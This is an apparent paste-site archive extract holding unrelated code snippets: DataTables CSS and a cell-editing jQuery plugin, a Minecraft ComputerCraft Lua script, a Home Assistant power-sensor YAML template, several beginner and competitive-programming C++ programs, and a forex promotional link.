  width: 100%;
  margin: 0 auto;
  clear: both;
  border-collapse: separate;
  border-spacing: 0;
  /*
   * Header and footer styles
   */
  /*
   * Body styles
   */
}
table.dataTable thead th,
table.dataTable tfoot th {
  font-weight: bold;
}
table.dataTable thead th,
table.dataTable thead td {
  padding: 10px;
  border-bottom: 1px solid darkgray;
}
table.dataTable thead th:active,
table.dataTable thead td:active {
  outline: none;
}
table.dataTable tfoot th,
table.dataTable tfoot td {
  padding: 10px 10px 6px 10px;
  border-top: 1px solid darkgray;
}
table.dataTable tbody tr {
  background-color: #f2f2f2;
}
table.dataTable tbody tr.selected > * {
  box-shadow: inset 0 0 0 9999px lightyellow;
  color: black;
}
table.dataTable tbody tr.selected a {
  color: #090a0b;
}
table.dataTable tbody th,
table.dataTable tbody td {
  padding: 8px 10px;
}
table.dataTable.row-border tbody th, table.dataTable.row-border tbody td, table.dataTable.display tbody th, table.dataTable.display tbody td {
  border-top: 1px solid #cecece;
}
table.dataTable.row-border tbody tr:first-child th,
table.dataTable.row-border tbody tr:first-child td, table.dataTable.display tbody tr:first-child th,
table.dataTable.display tbody tr:first-child td {
  border-top: none;
}
table.dataTable.cell-border tbody th, table.dataTable.cell-border tbody td {
  border-top: 1px solid #cecece;
  border-right: 1px solid #cecece;
}
table.dataTable.cell-border tbody tr th:first-child,
table.dataTable.cell-border tbody tr td:first-child {
  border-left: 1px solid #cecece;
}
table.dataTable.cell-border tbody tr:first-child th,
table.dataTable.cell-border tbody tr:first-child td {
  border-top: none;
}
table.dataTable.stripe > tbody > tr.odd > *, table.dataTable.display > tbody > tr.odd > * {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.023);
}
table.dataTable.stripe > tbody > tr.odd.selected > *, table.dataTable.display > tbody > tr.odd.selected > * {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.hover > tbody > tr:hover > *, table.dataTable.display > tbody > tr:hover > * {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.035);
}
table.dataTable.hover > tbody > tr.selected:hover > *, table.dataTable.display > tbody > tr.selected:hover > * {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.order-column > tbody tr > .sorting_1,
table.dataTable.order-column > tbody tr > .sorting_2,
table.dataTable.order-column > tbody tr > .sorting_3, table.dataTable.display > tbody tr > .sorting_1,
table.dataTable.display > tbody tr > .sorting_2,
table.dataTable.display > tbody tr > .sorting_3 {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.019);
}
table.dataTable.order-column > tbody tr.selected > .sorting_1,
table.dataTable.order-column > tbody tr.selected > .sorting_2,
table.dataTable.order-column > tbody tr.selected > .sorting_3, table.dataTable.display > tbody tr.selected > .sorting_1,
table.dataTable.display > tbody tr.selected > .sorting_2,
table.dataTable.display > tbody tr.selected > .sorting_3 {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.display > tbody > tr.odd > .sorting_1, table.dataTable.order-column.stripe > tbody > tr.odd > .sorting_1 {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.054);
}
table.dataTable.display > tbody > tr.odd > .sorting_2, table.dataTable.order-column.stripe > tbody > tr.odd > .sorting_2 {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.047);
}
table.dataTable.display > tbody > tr.odd > .sorting_3, table.dataTable.order-column.stripe > tbody > tr.odd > .sorting_3 {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.039);
}
table.dataTable.display > tbody > tr.odd.selected > .sorting_1, table.dataTable.order-column.stripe > tbody > tr.odd.selected > .sorting_1 {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.display > tbody > tr.odd.selected > .sorting_2, table.dataTable.order-column.stripe > tbody > tr.odd.selected > .sorting_2 {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.display > tbody > tr.odd.selected > .sorting_3, table.dataTable.order-column.stripe > tbody > tr.odd.selected > .sorting_3 {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.display > tbody > tr.even > .sorting_1, table.dataTable.order-column.stripe > tbody > tr.even > .sorting_1 {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.019);
}
table.dataTable.display > tbody > tr.even > .sorting_2, table.dataTable.order-column.stripe > tbody > tr.even > .sorting_2 {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.011);
}
table.dataTable.display > tbody > tr.even > .sorting_3, table.dataTable.order-column.stripe > tbody > tr.even > .sorting_3 {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.003);
}
table.dataTable.display > tbody > tr.even.selected > .sorting_1, table.dataTable.order-column.stripe > tbody > tr.even.selected > .sorting_1 {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.display > tbody > tr.even.selected > .sorting_2, table.dataTable.order-column.stripe > tbody > tr.even.selected > .sorting_2 {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.display > tbody > tr.even.selected > .sorting_3, table.dataTable.order-column.stripe > tbody > tr.even.selected > .sorting_3 {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.display tbody tr:hover > .sorting_1, table.dataTable.order-column.hover tbody tr:hover > .sorting_1 {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.082);
}
table.dataTable.display tbody tr:hover > .sorting_2, table.dataTable.order-column.hover tbody tr:hover > .sorting_2 {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.074);
}
table.dataTable.display tbody tr:hover > .sorting_3, table.dataTable.order-column.hover tbody tr:hover > .sorting_3 {
  box-shadow: inset 0 0 0 9999px rgba(0, 0, 0, 0.062);
}
table.dataTable.display tbody tr:hover.selected > .sorting_1, table.dataTable.order-column.hover tbody tr:hover.selected > .sorting_1 {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.display tbody tr:hover.selected > .sorting_2, table.dataTable.order-column.hover tbody tr:hover.selected > .sorting_2 {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.display tbody tr:hover.selected > .sorting_3, table.dataTable.order-column.hover tbody tr:hover.selected > .sorting_3 {
  box-shadow: inset 0 0 0 9999px #2b93b8;
}
table.dataTable.no-footer {
  border-bottom: 1px solid darkgray;
}
table.dataTable.compact thead th,
table.dataTable.compact thead td {
  padding: 4px 17px;
}
table.dataTable.compact tfoot th,
table.dataTable.compact tfoot td {
  padding: 4px;
}
table.dataTable.compact tbody th,
table.dataTable.compact tbody td {
  padding: 4px;
}
 
table.dataTable th,
table.dataTable td {
  box-sizing: content-box;
}
 
/*
 * Control feature layout
 */
.dataTables_wrapper {
  position: relative;
  clear: both;
}
.dataTables_wrapper .dataTables_length {
  float: left;
}
.dataTables_wrapper .dataTables_length select {
  border: 1px solid #aaa;
  border-radius: 3px;
  padding: 5px;
  background-color: transparent;
  padding: 4px;
}
.dataTables_wrapper .dataTables_filter {
  float: right;
  text-align: right;
}
.dataTables_filter{
    margin-bottom: 20px;
}
.dataTables_wrapper .dataTables_filter input {
  border: 1px solid #aaa;
  border-radius: 3px;
  padding: 5px;
  background-color: transparent;
  margin-left: 3px;
}
.dataTables_wrapper .dataTables_info {
  clear: both;
  float: left;
  padding-top: 0.755em;
}
.dataTables_wrapper .dataTables_paginate {
  float: right;
  text-align: right;
  padding-top: 0.25em;
}
.dataTables_wrapper .dataTables_paginate .paginate_button {
  box-sizing: border-box;
  display: inline-block;
  min-width: 1.5em;
  padding: 0.5em 1em;
  margin-left: 2px;
  text-align: center;
  text-decoration: none !important;
  cursor: pointer;
  color: #333333 !important;
  border: 1px solid transparent;
  border-radius: 2px;
}
.dataTables_wrapper .dataTables_paginate .paginate_button.current, .dataTables_wrapper .dataTables_paginate .paginate_button.current:hover {
  color: #333333 !important;
  border: 1px solid darkgray;
  background-color: rgba(230, 230, 230, 0.1);
  background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, rgba(230, 230, 230, 0.1)), color-stop(100%, rgba(0, 0, 0, 0.1)));
  /* Chrome,Safari4+ */
  background: -webkit-linear-gradient(top, rgba(230, 230, 230, 0.1) 0%, rgba(0, 0, 0, 0.1) 100%);
  /* Chrome10+,Safari5.1+ */
  background: -moz-linear-gradient(top, rgba(230, 230, 230, 0.1) 0%, rgba(0, 0, 0, 0.1) 100%);
  /* FF3.6+ */
  background: -ms-linear-gradient(top, rgba(230, 230, 230, 0.1) 0%, rgba(0, 0, 0, 0.1) 100%);
  /* IE10+ */
  background: -o-linear-gradient(top, rgba(230, 230, 230, 0.1) 0%, rgba(0, 0, 0, 0.1) 100%);
  /* Opera 11.10+ */
  background: linear-gradient(to bottom, rgba(230, 230, 230, 0.1) 0%, rgba(0, 0, 0, 0.1) 100%);
  /* W3C */
}
.dataTables_wrapper .dataTables_paginate .paginate_button.disabled, .dataTables_wrapper .dataTables_paginate .paginate_button.disabled:hover, .dataTables_wrapper .dataTables_paginate .paginate_button.disabled:active {
  cursor: default;
  color: #666 !important;
  border: 1px solid transparent;
  background: transparent;
  box-shadow: none;
}
.dataTables_wrapper .dataTables_paginate .paginate_button:hover {
  color: white !important;
  border: 1px solid #2695bd;
  background-color: #8acfe8;
  background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #8acfe8), color-stop(100%, #2695bd));
  /* Chrome,Safari4+ */
  background: -webkit-linear-gradient(top, #8acfe8 0%, #2695bd 100%);
  /* Chrome10+,Safari5.1+ */
  background: -moz-linear-gradient(top, #8acfe8 0%, #2695bd 100%);
  /* FF3.6+ */
  background: -ms-linear-gradient(top, #8acfe8 0%, #2695bd 100%);
  /* IE10+ */
  background: -o-linear-gradient(top, #8acfe8 0%, #2695bd 100%);
  /* Opera 11.10+ */
  background: linear-gradient(to bottom, #8acfe8 0%, #2695bd 100%);
  /* W3C */
}
.dataTables_wrapper .dataTables_paginate .paginate_button:active {
  outline: none;
  background-color: #3eafd8;
  background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #3eafd8), color-stop(100%, #248eb5));
  /* Chrome,Safari4+ */
  background: -webkit-linear-gradient(top, #3eafd8 0%, #248eb5 100%);
  /* Chrome10+,Safari5.1+ */
  background: -moz-linear-gradient(top, #3eafd8 0%, #248eb5 100%);
  /* FF3.6+ */
  background: -ms-linear-gradient(top, #3eafd8 0%, #248eb5 100%);
  /* IE10+ */
  background: -o-linear-gradient(top, #3eafd8 0%, #248eb5 100%);
  /* Opera 11.10+ */
  background: linear-gradient(to bottom, #3eafd8 0%, #248eb5 100%);
  /* W3C */
  box-shadow: inset 0 0 3px #111;
}
.dataTables_wrapper .dataTables_paginate .ellipsis {
  padding: 0 1em;
}
.dataTables_wrapper .dataTables_length,
.dataTables_wrapper .dataTables_filter,
.dataTables_wrapper .dataTables_info,
.dataTables_wrapper .dataTables_processing,
.dataTables_wrapper .dataTables_paginate {
  color: #333333;
}
.dataTables_wrapper .dataTables_scroll {
  clear: both;
}
.dataTables_wrapper .dataTables_scroll div.dataTables_scrollBody {
  -webkit-overflow-scrolling: touch;
}
.dataTables_wrapper .dataTables_scroll div.dataTables_scrollBody > table > thead > tr > th, .dataTables_wrapper .dataTables_scroll div.dataTables_scrollBody > table > thead > tr > td, .dataTables_wrapper .dataTables_scroll div.dataTables_scrollBody > table > tbody > tr > th, .dataTables_wrapper .dataTables_scroll div.dataTables_scrollBody > table > tbody > tr > td {
  vertical-align: middle;
}
.dataTables_wrapper .dataTables_scroll div.dataTables_scrollBody > table > thead > tr > th > div.dataTables_sizing,
.dataTables_wrapper .dataTables_scroll div.dataTables_scrollBody > table > thead > tr > td > div.dataTables_sizing, .dataTables_wrapper .dataTables_scroll div.dataTables_scrollBody > table > tbody > tr > th > div.dataTables_sizing,
.dataTables_wrapper .dataTables_scroll div.dataTables_scrollBody > table > tbody > tr > td > div.dataTables_sizing {
  height: 0;
  overflow: hidden;
  margin: 0 !important;
  padding: 0 !important;
}
.dataTables_wrapper.no-footer .dataTables_scrollBody {
  border-bottom: 1px solid darkgray;
}
.dataTables_wrapper.no-footer div.dataTables_scrollHead table.dataTable,
.dataTables_wrapper.no-footer div.dataTables_scrollBody > table {
  border-bottom: none;
}
.dataTables_wrapper:after {
  visibility: hidden;
  display: block;
  content: """";
  clear: both;
  height: 0;
}
 
@media screen and (max-width: 767px) {
  .dataTables_wrapper .dataTables_info,
.dataTables_wrapper .dataTables_paginate {
    float: none;
    text-align: center;
  }
  .dataTables_wrapper .dataTables_paginate {
    margin-top: 0.5em;
  }
}
@media screen and (max-width: 640px) {
  .dataTables_wrapper .dataTables_length,
.dataTables_wrapper .dataTables_filter {
    float: none;
    text-align: center;
  }
  .dataTables_wrapper .dataTables_filter {
    margin-top: 0.5em;
  }
}




.my-input-class {
  width: 90%;
  /* padding: 3px 3px; */
  border: 1px solid #ccc;
  border-radius: 4px;
  /* margin-bottom: 10px; */
}

.my-confirm-class {
  padding: 6px 6px;
  font-size: 12px;
  color: white !important;
  text-align: center;
  vertical-align: middle;
  border-radius: 4px;
  background-color: #337ab7;
  text-decoration: none;
  margin-right: 3px;
}

.my-cancel-class {
  padding: 6px 6px;
  font-size: 12px;
  color: white !important;
  text-align: center;
  vertical-align: middle;
  border-radius: 4px;
  background-color: #a94442;
  text-decoration: none;
}
.row-design{
  /* display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column; */
  word-break: keep-all !important;
}
.fix-date-design{
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: row;
  gap: 2px;
}
.error {
  border: solid 1px;
  border-color: #a94442;
}

#student_table > tbody > tr > td {
  word-break: break-all;
  word-wrap: break-word;
}
#student_table > tr > td:first-child{
  width: 50px !important;
}
div.dataTables_wrapper {
    margin: 0 auto;
}

div.container {
    width: 80%;
}"
Vznk3V2C,dataTables.cellEdit.js,rivg26,JavaScript,Monday 2nd of October 2023 01:05:26 PM CDT,"/*! CellEdit 1.0.19
 * ©2016 Elliott Beaty - datatables.net/license
 */

/**
 * @summary     CellEdit
 * @description Make a cell editable when clicked upon
 * @version     1.0.19
 * @file        dataTables.editCell.js
 * @author      Elliott Beaty
 * @contact     elliott@elliottbeaty.com
 * @copyright   Copyright 2016 Elliott Beaty
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

jQuery.fn.dataTable.Api.register('MakeCellsEditable()', function (settings) {
    var table = this.table();

    jQuery.fn.extend({
        // UPDATE
        updateEditableCell: function (callingElement) {
            // Need to redeclare table here for situations where we have more than one datatable on the page. See issue6 on github
            var table = $(callingElement).closest(""table"").DataTable().table();
            var row = table.row($(callingElement).parents('tr'));
            var cell = table.cell($(callingElement).parents('td, th'));
            var columnIndex = cell.index().column;
            var inputField =getInputField(callingElement);

            // Update
            var newValue = inputField.val();
            if (!newValue && ((settings.allowNulls) && settings.allowNulls != true)) {
                // If columns specified
                if (settings.allowNulls.columns) {
                    // If current column allows nulls
                    if (settings.allowNulls.columns.indexOf(columnIndex) > -1) {
                        _update(newValue);
                    } else {
                        _addValidationCss();
                    }
                    // No columns allow null
                } else if (!newValue) {
                    _addValidationCss();
                }
                //All columns allow null
            } else if (newValue && settings.onValidate) {
                if (settings.onValidate(cell, row, newValue)) {
                    _update(newValue);
                } else {
                    _addValidationCss();
                }
            }
            else {
                _update(newValue);
            }
            function _addValidationCss() {
                // Show validation error
                if (settings.allowNulls.errorClass) {
                    $(inputField).addClass(settings.allowNulls.errorClass);
                } else {
                    $(inputField).css({ ""border"": ""red solid 1px"" });
                }
            }
            function _update(newValue) {
                var oldValue = cell.data();
                cell.data(newValue);
                //Return cell & row.
                settings.onUpdate(cell, row, oldValue);
            }
            // Get current page
            var currentPageIndex = table.page.info().page;

            //Redraw table
            table.page(currentPageIndex).draw(false);
        },
        // CANCEL
        cancelEditableCell: function (callingElement) {
            var table = $(callingElement.closest(""table"")).DataTable().table();
            var cell = table.cell($(callingElement).parents('td, th'));
            // Set cell to it's original value
            cell.data(cell.data());

            // Redraw table
            table.draw();
        }
    });

    // Destroy
    if (settings === ""destroy"") {
        $(table.body()).off(""click"", ""td"");
        table = null;
    }

    if (table != null) {
        // On cell click
        $(table.body()).on('click', 'td', function () {

            var currentColumnIndex = table.cell(this).index().column;

            // DETERMINE WHAT COLUMNS CAN BE EDITED
            if ((settings.columns && settings.columns.indexOf(currentColumnIndex) > -1) || (!settings.columns)) {
                var row = table.row($(this).parents('tr'));
                editableCellsRow = row;

                var cell = table.cell(this).node();
                var row_selected = table.cell(this).index().row;
                var column_selected = table.cell(this).index().column + 1;
                var oldValue = table.cell(this).data();
                // Sanitize value
                oldValue = sanitizeCellValue(oldValue);

                // Show input
                if (!$(cell).find('input').length && !$(cell).find('select').length && !$(cell).find('textarea').length) {
                    // Input CSS
                    var input = getInputHtml(currentColumnIndex, settings, oldValue);
                    $(cell).html(input.html);
                    if (input.focus) {

                        var tmp_data = $('#student_table tbody tr:eq(' + row_selected + ') td:nth-child(' + column_selected + ') #ejbeatycelledit').val();
                        // $('#ejbeatycelledit').val('').blur().val(tmp_data);
                        $('#student_table tbody tr:eq(' + row_selected + ') td:nth-child(' + column_selected + ') #ejbeatycelledit').focus().val('').blur().focus().val(tmp_data);
                        
                    }
                }
            }
        });
    }

});

function getInputHtml(currentColumnIndex, settings, oldValue) {
    var inputSetting, inputType, input, inputCss, confirmCss, cancelCss, startWrapperHtml = '', endWrapperHtml = '', listenToKeys = true;

    input = {""focus"":true,""html"":null};

    if(settings.inputTypes){
		$.each(settings.inputTypes, function (index, setting) {
			if (setting.column == currentColumnIndex) {
				inputSetting = setting;
				inputType = inputSetting.type.toLowerCase();
			}
		});
	}

    if (settings.inputCss) { inputCss = settings.inputCss; }
    if (settings.wrapperHtml) {
        var elements = settings.wrapperHtml.split('{content}');
        if (elements.length === 2) {
            startWrapperHtml = elements[0];
            endWrapperHtml = elements[1];
        }
    }
    
    if (settings.confirmationButton) {
        if (settings.confirmationButton.listenToKeys) { listenToKeys = settings.confirmationButton.listenToKeys; }
        confirmCss = settings.confirmationButton.confirmCss;
        cancelCss = settings.confirmationButton.cancelCss;
        inputType = inputType;
    }
    switch (inputType) {
        case ""list"":
            input.html = startWrapperHtml + ""<select class='"" + inputCss + ""' onchange='$(this).updateEditableCell(this);' onfocusout='$(this).cancelEditableCell(this);' >"";
            $.each(inputSetting.options, function (index, option) {
                if (oldValue == option.value) {
                   input.html = input.html + ""<option value='"" + option.value + ""' selected>"" + option.display + ""</option>""
                } else {
                   input.html = input.html + ""<option value='"" + option.value + ""' >"" + option.display + ""</option>""
                }
            });
            input.html = input.html + ""</select>"" + endWrapperHtml;
            input.focus = false;
            break;
        case ""list-confirm"": // List w/ confirm
            input.html = startWrapperHtml + ""<select class='"" + inputCss + ""'>"";
            $.each(inputSetting.options, function (index, option) {
                if (oldValue == option.value) {
                   input.html = input.html + ""<option value='"" + option.value + ""' selected>"" + option.display + ""</option>""
                } else {
                   input.html = input.html + ""<option value='"" + option.value + ""' >"" + option.display + ""</option>""
                }
            });
            input.html = input.html + ""</select>&nbsp;<a href='javascript:void(0);' class='"" + confirmCss + ""' onclick='$(this).updateEditableCell(this);'>Confirm</a> <a href='javascript:void(0);' class='"" + cancelCss + ""' onclick='$(this).cancelEditableCell(this)'>Cancel</a>"" + endWrapperHtml;
            input.focus = false;
            break;
        case ""datepicker"": //Both datepicker options work best when confirming the values
        case ""datepicker-confirm"":
            // Makesure jQuery UI is loaded on the page
            if (typeof jQuery.ui == 'undefined') {
                alert(""jQuery UI is required for the DatePicker control but it is not loaded on the page!"");
                break;
            }
	        jQuery("".datepick"").datepicker(""destroy"");
	        input.html = startWrapperHtml + ""<input id='ejbeatycelledit' type='text' name='date' class='datepick "" + inputCss + ""'   value='""+oldValue+""'"" + (listenToKeys ? "" onkeyup='if(event.keyCode==13) {$(this).updateEditableCell(this);} else if (event.keyCode===27) {$(this).cancelEditableCell(this);}'"" : """") + ""></input>"";
	        setTimeout(function () { //Set timeout to allow the script to write the input.html before triggering the datepicker
	            var icon = ""http://jqueryui.com/resources/demos/datepicker/images/calendar.gif"";
                // Allow the user to provide icon
	            if (typeof inputSetting.options !== 'undefined' && typeof inputSetting.options.icon !== 'undefined') {
	                icon = inputSetting.options.icon;
	            }
	            var self = jQuery('.datepick').datepicker(
                    {
                        showOn: ""button"",
                        buttonImage: icon,
                        buttonImageOnly: true,
                        buttonText: ""Select date"",
                        changeMonth: true,
                        changeYear: true,
                        showButtonPanel: true,
                        dateFormat: ""mm/dd/yy"",
                        yearRange: ""-100:+0""
                    });
	        },100);
	        break;
        case ""text-confirm"": // text input w/ confirm
            input.html = startWrapperHtml + ""<input id='ejbeatycelledit' class='"" + inputCss + ""' value='""+oldValue+""'"" + (listenToKeys ? "" onkeyup='if(event.keyCode==13) {$(this).updateEditableCell(this);} else if (event.keyCode===27) {$(this).cancelEditableCell(this);}'"" : """") + ""></input>&nbsp;<a href='javascript:void(0);' class='"" + confirmCss + ""' onclick='$(this).updateEditableCell(this)'>Confirm</a> <a href='javascript:void(0);' class='"" + cancelCss + ""' onclick='$(this).cancelEditableCell(this)'>Cancel</a>"" + endWrapperHtml;
            break;
        case ""undefined-confirm"": // text input w/ confirm
            input.html = startWrapperHtml + ""<input id='ejbeatycelledit' class='"" + inputCss + ""' value='"" + oldValue + ""'"" + (listenToKeys ? "" onkeyup='if(event.keyCode==13) {$(this).updateEditableCell(this);} else if (event.keyCode===27) {$(this).cancelEditableCell(this);}'"" : """") + ""></input>&nbsp;<a href='javascript:void(0);' class='"" + confirmCss + ""' onclick='$(this).updateEditableCell(this)'>Confirm</a> <a href='javascript:void(0);' class='"" + cancelCss + ""' onclick='$(this).cancelEditableCell(this)'>Cancel</a>"" + endWrapperHtml;
            break;
        case ""textarea"":
            input.html = startWrapperHtml + ""<textarea id='ejbeatycelledit' class='"" + inputCss + ""'  onfocusout='$(this).updateEditableCell(this)' >""+oldValue+""</textarea>"" + endWrapperHtml;
            break;
        case ""textarea-confirm"":
            input.html = startWrapperHtml + ""<textarea id='ejbeatycelledit' class='"" + inputCss + ""'>""+oldValue+""</textarea><a href='javascript:void(0);' class='"" + confirmCss + ""' onclick='$(this).updateEditableCell(this)'>Confirm</a> <a href='javascript:void(0);' class='"" + cancelCss + ""' onclick='$(this).cancelEditableCell(this)'>Cancel</a>"" + endWrapperHtml;
            break;
	case ""number-confirm"" :
	    input.html = startWrapperHtml + ""<input id='ejbeatycelledit' type='number' class='"" + inputCss + ""' value='""+oldValue+""'"" + (listenToKeys ? "" onkeyup='if(event.keyCode==13) {$(this).updateEditableCell(this);} else if (event.keyCode===27) {$(this).cancelEditableCell(this);}'"" : """") + ""></input>&nbsp;<a href='javascript:void(0);' class='"" + confirmCss + ""' onclick='$(this).updateEditableCell(this)'>Confirm</a> <a href='javascript:void(0);' class='"" + cancelCss + ""' onclick='$(this).cancelEditableCell(this)'>Cancel</a>"" + endWrapperHtml;
	    break;
        default: // text input
            input.html = startWrapperHtml + ""<input id='ejbeatycelledit' class='"" + inputCss + ""' value='""+oldValue+""'"" + (listenToKeys ? "" onkeyup='if(event.keyCode==13) {$(this).updateEditableCell(this);} else if (event.keyCode===27) {$(this).cancelEditableCell(this);}'"" : """") + ""></input>"" + endWrapperHtml;
            break;
    }
    return input;
}

function getInputField(callingElement) {
    // Update datatables cell value
    var inputField;
    switch ($(callingElement).prop('nodeName').toLowerCase()) {
        case 'a': // This means they're using confirmation buttons
            if ($(callingElement).siblings('input').length > 0) {
                inputField = $(callingElement).siblings('input');
            }
            if ($(callingElement).siblings('select').length > 0) {
                inputField = $(callingElement).siblings('select');
            }
            if ($(callingElement).siblings('textarea').length > 0) {
                inputField = $(callingElement).siblings('textarea');
            }
        break;
        default:
            inputField = $(callingElement);
    }
    return inputField;
}

function sanitizeCellValue(cellValue) {
    if (typeof (cellValue) === 'undefined' || cellValue === null || cellValue.length < 1) {
        return """";
    }

    // If not a number
    if (isNaN(cellValue)) {
        // escape single quote
        cellValue = cellValue.replace(/'/g, ""&#39;"");
    }
    return cellValue;
}"
qDzAE2A9,FBS 100% Bonus | Turbocharge Your Trading Capital,fxvnpro,PHP,Monday 2nd of October 2023 12:59:50 PM CDT,https://www.fxvnpro.com/fbs-100-bonus-turbocharge-your-trading-capital/
Y4VMVpeB,Untitled,zwenboy,Lua,Monday 2nd of October 2023 12:50:23 PM CDT,"local manager = peripheral.find(""inventoryManager"")
if manager == nil then error(""inventoryManager not found"") end
local event, username, message, uuid, isHidden = os.pullEvent(""chat"")

print(""The 'chat' event was fired with the username "" .. username .. "" and the message "" .. message)

if message == '!give torch' then
	manager.addItemToPlayer(""top"", 1, nil, 'minecraft:torch')
end
"
wDh1qsZw,Untitled,Rofyda_Elghadban1,C++,Monday 2nd of October 2023 12:43:08 PM CDT," #include <bits/stdc++.h> 
 #define ll long long
 #define ull unsigned long long
 #define pi 3.141592654
 #define NUM 1e18
 #define Mod  1'000'000'007
 #define fixed(n) fixed<<setprecision(n)
 #define cin(v) for(auto &i:v) cin >> i ;
 #define cout(v) for(auto &i:v) cout << i  <<"" "";
 #define vowel(x) (x=='e'||x=='a'||x=='i'||x=='o'||x=='u')
 #define small(x) (x>=97&&x<=122)
 #define capital(x) (x>=65&&x<=90)
 #define Tolower(s) transform(s.begin(),s.end(),s.begin(),::tolower);
 #define Toupper(s) transform(s.begin(),s.end(),s.begin(),::toupper); 
 #define all(v) ((v).begin()), ((v).end())
 #define allr(v) ((v).rbegin()), ((v).rend())
 #define updmax(a,b) a=max(a,b)
 #define updmin(a,b) a=min(a,b)
 #define ceil(a,b) ((a/b)+(a%b?1:0))
 /* asc -> 1 2 3 ,des -> 3 2 1 */
 /***********************************************************************************/
 using namespace std;
 void Rofyda_Elghadban(){
  #ifndef ONLINE_JUDGE   
    freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout);
   #endif
    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);
 }

 struct com{
  bool operator()(int l,int r){
    return (l>=50)<(r>=50);
  }
 };

 void solve(){
  int n,sum=0,counter=0,e=0,maxi1=INT_MIN,maxi2=INT_MIN,ans=0;
  cin>>n;
  vector<int>v(n),m,p;
  cin(v);
  for(int i=0;i<n;i++){
    for(int j=i;j<n;j++){
      sum+=v[j];
      if(sum<0){
        maxi1=max(maxi1,ans);
        sum=0;
        ans=0;
      }else{
        ans++;
      }
    }
    for(int k=0;k<i;k++){
      sum+=v[k];
      if(sum<0){
        maxi2=max(maxi2,ans);
        sum=0;
        ans=0;
      }else{
        ans++;
      }
    }
  }
  if((maxi1+maxi2)>=n){
    cout<<(maxi1+maxi2)/2<<""\n"";
  }else{
    cout<<maxi1+maxi2<<""\n"";
  }
 }

 int main(){
  Rofyda_Elghadban();
  solve();
 
  return 0;
 }
  "
Q6PCBEub,Untitled,chemelli74,YAML,Monday 2nd of October 2023 12:42:41 PM CDT,"- platform: template
  sensors:
    custom_unmonitored_power:
      friendly_name: Consumi non gestiti
      unique_id: custom_unmonitored_power
      device_class: power
      unit_of_measurement: W
      value_template: ""{%- set ns = namespace(states=[0]) -%}
      {%- for s in states.sensor if s.state != 'unavailable' and
          'sensor.consumi_' not in s.entity_id and
          s.entity_id not in ['sensor.custom_unmonitored_power',
                              'sensor.quadro_phase_a_active_power',
                              'sensor.quadro_quadro_total_active_power',
                              'sensor.ups_potenza_reale_nominale']
      -%}
        {%- if 'unit_of_measurement' in s.attributes and s.attributes.unit_of_measurement == 'W' -%}
          {# For debug: {{ s.state + ' -- ' + s.entity_id + '\n'}} #}
          {%- set ns.states = ns.states + [ s.state | float(0) ] -%}
        {%- endif -%}
      {%- endfor -%}
      {%- set monitoredpower = ns.states | sum | round(2) -%}
      {# For debug: {{ monitoredpower | string + '\n'}} #}
      {%- set totalpower = states('sensor.quadro_phase_a_active_power') | float(0) -%}
      {# For debug: {{ totalpower | string + '\n' }} #}
      {%- set delta = ((totalpower - monitoredpower) | float(0)) -%}
      {# For debug: {{ delta | string + '\n'}}#}
      {%- if delta > 0 -%}
        {{ delta | round(2)}}
      {%- else -%}
        {{ 0.0 }}
      {%- endif -%}"""
xTCBatcd,Untitled,clandast,C++,Monday 2nd of October 2023 12:38:42 PM CDT,"#include <iostream>
#include <cmath>


float task1(float c) {
    return powf(c, 3) / cosf(c);
}

float task2(float a, float b) {
    return powf(a, 2) + powf(b, 2);
}


float task3(float x, float b, float e) {
    return sqrtf(fabsf(x)) + powf(e, sqrtf(b));
}

int main() {
    float x, b, a, c, y;

    std::cout << ""Enter a number b:"";
    std::cin >> b;

    std::cout << ""Enter a number x:"";
    std::cin >> x;

    c = task2(x, b);  
    a = task3(x, b, expf(1.0f));
    y = task1(c);

    std::cout << ""Result of task2: "" << c << std::endl;
    std::cout << ""Result of task3: "" << a << std::endl;
    std::cout << ""Result of task1: "" << y << std::endl;

    return 0;
}
"
Cc4fpuCr,Untitled,Rofyda_Elghadban1,C++,Monday 2nd of October 2023 12:37:06 PM CDT," #include <bits/stdc++.h> 
 #define ll long long
 #define ull unsigned long long
 #define pi 3.141592654
 #define NUM 1e18
 #define Mod  1'000'000'007
 #define fixed(n) fixed<<setprecision(n)
 #define cin(v) for(auto &i:v) cin >> i ;
 #define cout(v) for(auto &i:v) cout << i  <<"" "";
 #define vowel(x) (x=='e'||x=='a'||x=='i'||x=='o'||x=='u')
 #define small(x) (x>=97&&x<=122)
